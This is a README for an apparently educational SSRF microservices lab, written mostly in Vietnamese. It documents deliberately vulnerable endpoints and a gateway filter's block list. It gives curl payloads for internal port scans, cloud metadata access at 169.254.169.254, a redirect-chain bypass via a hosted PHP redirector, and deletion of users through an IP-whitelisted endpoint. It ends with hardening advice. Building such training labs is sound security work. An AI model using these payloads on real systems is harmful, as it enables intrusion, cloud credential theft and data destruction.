# 🔒 SSRF Vulnerable Microservices Lab - Complete Testing Environment

> **Môi trường lab thực tế để học và test SSRF vulnerabilities với API Gateway protection**

[![Docker](https://img.shields.io/badge/Docker-Ready-blue)](https://www.docker.com/)
[![Java](https://img.shields.io/badge/Java-17-orange)](https://openjdk.org/)
[![Python](https://img.shields.io/badge/Python-3.9+-green)](https://www.python.org/)
[![Spring Boot](https://img.shields.io/badge/Spring%20Boot-3.1-brightgreen)](https://spring.io/projects/spring-boot)
[![Django](https://img.shields.io/badge/Django-4.2-darkgreen)](https://www.djangoproject.com/)

**Production Server:** https://quangtx.io.vn  
**Docker Hub:** https://hub.docker.com/u/tranquang04

---

## 📋 MỤC LỤC

1. [Tổng Quan](#-tổng-quan)
2. [Kiến Trúc Hệ Thống](#-kiến-trúc-hệ-thống)
3. [SSRF Vulnerabilities](#-ssrf-vulnerabilities)
4. [API Gateway Protection](#-api-gateway-protection)
5. [Setup & Deployment](#-setup--deployment)
6. [Blackbox Testing Guide](#-blackbox-testing-guide)
7. [Exploitation Examples](#-exploitation-examples)
8. [Security Assessment](#-security-assessment)

---

## 🎯 TỔNG QUAN

Lab này tạo ra một **môi trường microservices thực tế** với nhiều lỗ hổng SSRF khác nhau để:

✅ **Học cách phát hiện SSRF** trong các ứng dụng thực tế (blackbox testing)  
✅ **Khai thác SSRF** để tấn công inter-service communication  
✅ **Hiểu cách triển khai API Gateway** với SSRF protection filters  
✅ **Bypass techniques** khi có defense mechanisms  
✅ **Defense-in-depth strategies** để bảo vệ microservices

### 🏗️ Thành Phần Chính

- **4 Backend Services:** User (Spring Boot), Product (Django), Inventory (Flask), Order (Flask)
- **API Gateway:** Spring Cloud Gateway với SSRF Protection Filter
- **Redis:** Rate limiting cho gateway
- **PostgreSQL:** Database cho mỗi service (separate DBs)
- **Frontend:** React SPA
- **Nginx:** Reverse proxy (production)

---

## 🏛️ KIẾN TRÚC HỆ THỐNG

```
Internet (External Users)
         │
         ▼
┌─────────────────────────────────┐
│   Nginx Reverse Proxy (443)     │
│   - SSL/TLS Termination         │
│   - Rate Limiting               │
└────────────┬────────────────────┘
             │
             ▼
┌─────────────────────────────────┐
│   API Gateway (8080)             │◄──┐
│   - SSRF Protection Filter       │   │
│   - JWT Authentication           │   │ Redis
│   - Rate Limiting (Redis)        │   │ (6379)
│   - Request/Response Logging     │◄──┘
└─┬───────────┬───────────┬────────┘
  │           │           │
  ▼           ▼           ▼
┌─────────┐ ┌─────────┐ ┌──────────┐ ┌──────────┐
│  User   │ │ Product │ │Inventory │ │  Order   │
│ Service │ │ Service │ │ Service  │ │ Service  │
│ (8081)  │ │ (8082)  │ │  (8083)  │ │  (8084)  │
│ Java 17 │ │Django 4 │ │ Flask    │ │  Flask   │
└────┬────┘ └────┬────┘ └────┬─────┘ └────┬─────┘
     │           │           │            │
     ▼           ▼           ▼            ▼
┌─────────┐ ┌─────────┐ ┌─────────┐ ┌─────────┐
│Postgres │ │Postgres │ │Postgres │ │Postgres │
│  User   │ │ Product │ │Inventory│ │  Order  │
│  (5433) │ │  (5434) │ │  (5436) │ │  (5435) │
└─────────┘ └─────────┘ └─────────┘ └─────────┘
```

### 🔄 Request Flow

**Với API Gateway (Protected):**
```
User → Nginx:443 → Gateway:8080 → [SSRF Filter] → Backend Services
                                   ↓
                            403 nếu phát hiện SSRF
```

**Direct Access (Vulnerable - nếu ports exposed):**
```
Attacker → Backend:8081/8082/8083/8084 → No Protection → SSRF Success
```

---

## 🐛 SSRF VULNERABILITIES

Lab này chứa **8+ vulnerable endpoints** với các đặc điểm SSRF khác nhau:

### 📦 PRODUCT SERVICE (Django - Port 8082)

#### 1. **Price Comparison - GET/POST**
```bash
# Endpoint dễ bị tấn công nhất - accept cả GET và POST
GET  /api/products/{id}/check_price?compare_url=[URL]
POST /api/products/{id}/check_price
     Body: {"compare_url": "[URL]"}

# Mục đích: So sánh giá từ website khác
# Lỗ hổng: Fetch URL không validate → SSRF
```

**Exploitation:**
```bash
# Scan internal services
curl "https://quangtx.io.vn/api/products/1/check_price?compare_url=http://user-service:8081/api/users"

# Access metadata
curl "https://quangtx.io.vn/api/products/1/check_price?compare_url=http://169.254.169.254/latest/meta-data/"
```

#### 2. **Review Fetcher - GET/POST**
```bash
GET  /api/products/{id}/fetch_review?review_url=[URL]
POST /api/products/{id}/fetch_review
     Body: {"review_url": "[URL]"}

# Mục đích: Lấy review từ blog/website
# Lỗ hổng: Fetch full HTML content → blind SSRF + data exfiltration
```

#### 3. **Social Media Sharing - GET/POST**
```bash
GET  /api/products/{id}/share?share_api_url=[URL]
POST /api/products/{id}/share
     Body: {"share_api_url": "[URL]"}

# Mục đích: POST data lên social media API
# Lỗ hổng: POST request to arbitrary URL → SSRF with POST data
```

### 👤 USER SERVICE (Spring Boot - Port 8081)

#### 4. **Avatar Upload from URL**
```bash
GET  /api/users/{id}/avatar?image_url=[URL]
POST /api/users/{id}/avatar
     Body: {"image_url": "[URL]"}

# Mục đích: Upload avatar từ URL
# Lỗ hổng: Validate image by fetching → SSRF
```

#### 5. **Avatar URL Validator (Authenticated)**
```bash
GET  /api/users/me/avatar/validate?url=[URL]
POST /api/users/me/avatar/validate
     Body: {"url": "[URL]"}
     Header: Authorization: Bearer [JWT_TOKEN]

# Mục đích: Validate avatar URL trước khi set
# Lỗ hổng: Fetch để validate → authenticated SSRF
```

#### 6. **Email Domain Validation (Blind SSRF)**
```bash
POST /api/auth/register
Body: {
  "username": "attacker",
  "password": "pass123",
  "email": "admin@user-service:8081"  ← Blind SSRF
}

# Mục đích: Validate email domain
# Lỗ hổng: DNS lookup/HTTP check → blind SSRF, no response
```

#### 7. **Internal Delete Endpoint (IP Whitelist Bypass)**
```bash
DELETE /api/users/delete/{id}

# Đặc biệt: Chỉ cho phép IP từ Docker internal network
# Bypass: Dùng SSRF từ service khác để gọi endpoint này
```

---

## 🛡️ API GATEWAY PROTECTION

### Tính Năng Bảo Mật

#### 1. **SSRF Protection Filter**
```java
// Chặn các pattern nguy hiểm trong query parameters
- localhost, 127.0.0.1, ::1
- Internal hostnames: user-service, product-service, postgres-*
- Private IPs: 10.x.x.x, 172.16-31.x.x, 192.168.x.x
- Metadata endpoints: 169.254.169.254
```

**Response khi detect SSRF:**
```json
HTTP 403 Forbidden
X-SSRF-Protection: blocked
{
  "error": "Suspicious URL detected",
  "reason": "SSRF protection filter triggered"
}
```

#### 2. **JWT Authentication**
```yaml
Protected Routes:
  - /api/users/** (except /api/auth/*)
  - /api/orders/**
  
Public Routes:
  - /api/auth/login
  - /api/auth/register
  - /api/products/** (read-only)
```

#### 3. **Rate Limiting (Redis-based)**
```yaml
Auth endpoints: 10 req/s
User endpoints: 20 req/s
Product endpoints: 50 req/s
Order endpoints: 20 req/s
```

#### 4. **Request/Response Logging**
```java
// Log tất cả requests với SSRF detection alert
2025-12-02 04:15:55 - ⚠️ [SSRF ALERT] Potentially vulnerable endpoint accessed!
2025-12-02 04:15:55 - Method: GET, Path: /api/products/1/check_price
2025-12-02 04:15:55 - Query: compare_url=http://localhost:8081
```

### ⚠️ Limitations & Bypass Techniques

Gateway **KHÔNG CHẶN ĐƯỢC:**

1. **POST Body Parameters** → Gateway chỉ check query params
2. **HTTP Redirect Chains** → Follow redirects về internal services
3. **DNS Rebinding** → IP thay đổi sau khi qua filter
4. **URL Encoding Tricks** → IPv6 (::1), Hex IPs (0x7f000001)
5. **Direct Backend Access** → Nếu ports exposed ra public

---

## 🚀 SETUP & DEPLOYMENT

### Local Development

```bash
# 1. Clone repository
git clone https://github.com/yourusername/microservice-ssrf-lab.git
cd microservice-ssrf-lab

# 2. Start all services
docker-compose up -d

# 3. Verify services
docker ps
curl http://localhost:8080/actuator/health  # Gateway health check

# 4. Access frontend
open http://localhost:3000
```

### Production Deployment

```bash
# 1. Build và push images
cd api-gateway
docker build -t tranquang04/api-gateway:latest .
docker push tranquang04/api-gateway:latest

# 2. Deploy lên server
ssh -p 24700 quang@{your-ip-server}
cd ~/microservice-shop
docker-compose -f docker-compose.prod.yml pull
docker-compose -f docker-compose.prod.yml up -d

# 3. Configure Nginx
sudo nano /etc/nginx/sites-available/quangtx.io.vn
# Proxy tất cả requests → localhost:8080 (gateway)
sudo systemctl reload nginx

# 4. Test
curl https://quangtx.io.vn/api/products/
```

### Services & Ports

| Service | Port | URL | Status |
|---------|------|-----|--------|
| Frontend | 3000 | http://localhost:3000 | Public |
| API Gateway | 8080 | http://localhost:8080 | Public |
| User Service | 8081 | http://localhost:8081 | Internal |
| Product Service | 8082 | http://localhost:8082 | Internal |
| Inventory | 8083 | http://localhost:8083 | Internal |
| Order Service | 8084 | http://localhost:8084 | Internal |
| Redis | 6379 | redis://localhost:6379 | Internal |

**⚠️ Production:** Chỉ expose ports 80/443 (Nginx) và 22 (SSH). Backend services bind `127.0.0.1` only.

---

## 🕵️ BLACKBOX TESTING GUIDE

### Workflow Phát Hiện SSRF

#### **BƯỚC 1: RECONNAISSANCE**

```bash
# Không cần authentication
# Scan endpoints công khai
curl https://quangtx.io.vn/api/products/
curl https://quangtx.io.vn/api/auth/login

# Tìm parameters nhận URL
# Keywords: url, image, avatar, callback, redirect, link, fetch, import, proxy
```

#### **BƯỚC 2: REGISTER & LOGIN**

```bash
# Register user mới
curl -X POST https://quangtx.io.vn/api/auth/register \
  -H 'Content-Type: application/json' \
  -d '{
    "username": "pentester01",
    "password": "Test@123",
    "email": "test@example.com"
  }'

# Login lấy JWT token
TOKEN=$(curl -X POST https://quangtx.io.vn/api/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"pentester01","password":"Test@123"}' \
  | jq -r '.token')

echo "Token: $TOKEN"
```

#### **BƯỚC 3: FUZZING**

```bash
# Manual fuzzing
curl "https://quangtx.io.vn/api/products/1/check_price?compare_url=https://example.com" \
  -H "Authorization: Bearer $TOKEN"

# Nếu thấy response chứa content từ example.com → SSRF confirmed!

# Automated fuzzing với ffuf
ffuf -u "https://quangtx.io.vn/api/products/FUZZ/check_price?compare_url=http://localhost:8081" \
  -w ids.txt \
  -H "Authorization: Bearer $TOKEN" \
  -mc 200,500,403
```

#### **BƯỚC 4: CONFIRM SSRF**

**Method 1: Out-of-Band Detection (Recommended)**

```bash
# 1. Tạo webhook tại webhook.site → nhận URL: https://webhook.site/unique-id

# 2. Test SSRF
curl "https://quangtx.io.vn/api/products/1/check_price?compare_url=https://webhook.site/unique-id" \
  -H "Authorization: Bearer $TOKEN"

# 3. Check webhook.site → nếu thấy request từ IP 103.56.163.193 → CONFIRMED!
```

**Method 2: Burp Collaborator (Professional)**

```
1. Generate Collaborator payload
2. Insert vào parameter
3. Poll for DNS/HTTP interactions
```

#### **BƯỚC 5: EXPLOITATION**

```bash
# Scan internal services
curl "https://quangtx.io.vn/api/products/1/check_price?compare_url=http://user-service:8081/api/users" \
  -H "Authorization: Bearer $TOKEN"

# Access cloud metadata (AWS/Azure/GCP)
curl "https://quangtx.io.vn/api/products/1/check_price?compare_url=http://169.254.169.254/latest/meta-data/" \
  -H "Authorization: Bearer $TOKEN"

# Bypass IP whitelist
curl "https://quangtx.io.vn/api/products/1/check_price?compare_url=http://user-service:8081/api/users/delete/1" \
  -H "Authorization: Bearer $TOKEN"
```

### Tools Recommended

- **Burp Suite Professional:** Active scanning, Collaborator, Intruder
- **ffuf:** Fast URL fuzzing
- **nuclei:** Automated vulnerability scanning
- **curl + jq:** Manual testing
- **webhook.site:** Out-of-band detection
- **Python requests:** Custom scripts

---

## 💥 EXPLOITATION EXAMPLES

### Example 1: Internal Service Scan

```bash
# Scan tất cả internal services
for port in 8081 8082 8083 8084 5432 5433 5434 5435 5436 6379; do
  echo "Testing port $port..."
  curl -s "https://quangtx.io.vn/api/products/1/check_price?compare_url=http://localhost:$port" \
    -H "Authorization: Bearer $TOKEN" \
    | jq -r '.content_preview'
done
```

### Example 2: Bypass Gateway với POST Body

```bash
# Gateway chặn query param → bypass với POST body
curl -X POST "https://quangtx.io.vn/api/products/1/fetch_review" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"review_url": "http://user-service:8081/api/users"}'
```

### Example 3: Redirect Chain Bypass

```bash
# 1. Setup redirector trên VPS của bạn
# redirect.php:
<?php header("Location: http://user-service:8081/api/users"); ?>

# 2. Exploit
curl "https://quangtx.io.vn/api/products/1/check_price?compare_url=http://your-vps.com/redirect.php" \
  -H "Authorization: Bearer $TOKEN"

# Gateway pass (URL công khai) → Backend follow redirect → SSRF thành công!
```

### Example 4: Privilege Escalation via SSRF

```bash
# 1. User bình thường không có quyền delete
curl -X DELETE "https://quangtx.io.vn/api/users/delete/1" \
  -H "Authorization: Bearer $TOKEN"
# → 403 Forbidden (IP không nằm trong whitelist)

# 2. Bypass qua SSRF từ product-service (IP internal)
curl "https://quangtx.io.vn/api/products/1/check_price?compare_url=http://user-service:8081/api/users/delete/1" \
  -H "Authorization: Bearer $TOKEN"
# → User deleted! (Request từ internal IP 172.x.x.x)
```

### Example 5: Blind SSRF via Email

```bash
# Email validation trigger DNS lookup/HTTP check
curl -X POST "https://quangtx.io.vn/api/auth/register" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "attacker",
    "password": "Test@123",
    "email": "admin@webhook.site"
  }'

# Check webhook.site → nếu thấy HTTP request → blind SSRF confirmed!
```

---

## 🔒 SECURITY ASSESSMENT

### Current Protection Level: ⚠️ PARTIAL

| Attack Vector | Gateway Status | Backend Status | Overall Risk |
|--------------|----------------|----------------|--------------|
| Query param SSRF (localhost) | ✅ Blocked (403) | ❌ Vulnerable | 🟢 Low |
| Query param SSRF (private IP) | ✅ Blocked (403) | ❌ Vulnerable | 🟢 Low |
| POST body SSRF | ❌ Not checked | ❌ Vulnerable | 🔴 High |
| Redirect chain bypass | ❌ Follow redirects | ❌ Vulnerable | 🔴 High |
| DNS rebinding | ❌ Time-of-check issue | ❌ Vulnerable | 🟠 Medium |
| Direct backend access | ⚠️ Depends on firewall | ❌ Vulnerable | 🔴 High |
| Blind SSRF (email) | ⚠️ No validation | ❌ Vulnerable | 🟠 Medium |

### Defense-in-Depth Recommendations

#### ✅ **Implemented (1/5 layers)**
- [x] API Gateway with SSRF Protection Filter
- [x] JWT Authentication
- [x] Rate Limiting
- [x] Request/Response Logging

#### ⚠️ **Missing (4/5 layers)**

**Layer 2: Nginx Configuration**
```nginx
# /etc/nginx/sites-available/quangtx.io.vn
server {
    listen 443 ssl;
    server_name quangtx.io.vn;
    
    # ✅ CHỈ proxy qua Gateway
    location / {
        proxy_pass http://localhost:8080;
    }
    
    # ❌ CHẶN direct backend access
    location ~* ^/(8081|8082|8083|8084) {
        return 403;
    }
}
```

**Layer 3: Backend URL Validation**
```python
# product-service/products/views.py
ALLOWED_DOMAINS = ['example.com', 'trusted-partner.com']

def is_safe_url(url):
    parsed = urlparse(url)
    
    # Check scheme
    if parsed.scheme not in ['http', 'https']:
        return False
    
    # Check hostname not internal
    if parsed.hostname in INTERNAL_HOSTS:
        return False
    
    # Resolve IP and check if private
    ip = socket.gethostbyname(parsed.hostname)
    if is_private_ip(ip):
        return False
    
    # Whitelist only
    if parsed.hostname not in ALLOWED_DOMAINS:
        return False
    
    return True

# Disable redirects
response = requests.get(url, allow_redirects=False, timeout=5)
```

**Layer 4: Network Isolation**
```yaml
# docker-compose.prod.yml
networks:
  public-network:
    driver: bridge
  internal-network:
    driver: bridge
    internal: true  # No external access

services:
  api-gateway:
    networks:
      - public-network
      - internal-network
  
  user-service:
    networks:
      - internal-network  # Internal only
    ports: []  # No host binding
```

**Layer 5: Firewall Rules**
```bash
sudo ufw default deny incoming
sudo ufw allow 22/tcp    # SSH
sudo ufw allow 80/tcp    # HTTP
sudo ufw allow 443/tcp   # HTTPS
sudo ufw enable

# Backend services bind localhost only
user-service:
  ports:
    - "127.0.0.1:8081:8081"
```

---

## 📚 LEARNING RESOURCES

### Vulnerable Endpoints Summary

| Endpoint | Method | Auth | Parameter | SSRF Type |
|----------|--------|------|-----------|-----------|
| `/api/products/{id}/check_price` | GET/POST | ❌ | `compare_url` | Full response |
| `/api/products/{id}/fetch_review` | GET/POST | ❌ | `review_url` | Full response |
| `/api/products/{id}/share` | GET/POST | ❌ | `share_api_url` | POST SSRF |
| `/api/users/{id}/avatar` | GET/POST | ❌ | `image_url` | Validation SSRF |
| `/api/users/me/avatar/validate` | GET/POST | ✅ | `url` | Validation SSRF |
| `/api/auth/register` | POST | ❌ | `email` (domain) | Blind SSRF |
| `/api/users/delete/{id}` | DELETE | ❌ | - | IP whitelist bypass |

### Testing Scripts

```bash
# Quick test all endpoints
./quick-ssrf-test.sh

# Full exploitation demo
./ssrf-privilege-escalation-demo.ps1

# Deploy gateway locally
./build-and-test-gateway.ps1

# Deploy to production
./deploy-gateway-from-local.ps1
```

---

## 🤝 CONTRIBUTING

Contributions welcome! Please:

1. Fork repository
2. Create feature branch: `git checkout -b feature/new-vulnerability`
3. Test thoroughly
4. Submit PR with detailed description

**Ideas for contributions:**
- New SSRF vulnerable endpoints với bypass techniques khác
- Enhanced gateway filters (check POST body, follow redirects)
- Automated exploitation tools
- Additional defense mechanisms
- CTF-style challenges

---

## ⚠️ DISCLAIMER

**Lab này được tạo ONLY cho mục đích học tập và nghiên cứu security.**

- ❌ KHÔNG sử dụng techniques này trên hệ thống thực tế mà không có permission
- ❌ KHÔNG deploy lab này ra public internet mà không bảo mật
- ✅ CHỈ test trên môi trường riêng của bạn hoặc có authorized permission
- ✅ Sử dụng để học cách phát hiện và fix SSRF trong development

**Tác giả không chịu trách nhiệm cho bất kỳ misuse nào của lab này.**

---

## 📞 CONTACT & SUPPORT

- **Production Lab:** https://quangtx.io.vn
- **Docker Images:** https://hub.docker.com/u/tranquang04
- **Issues:** GitHub Issues tab
- **Email:** quang@quangtx.io.vn

---

## 📄 LICENSE

MIT License - Tự do sử dụng cho educational purposes.

---

**Happy Hacking! 🎯**

*"The best defense is understanding the offense"*
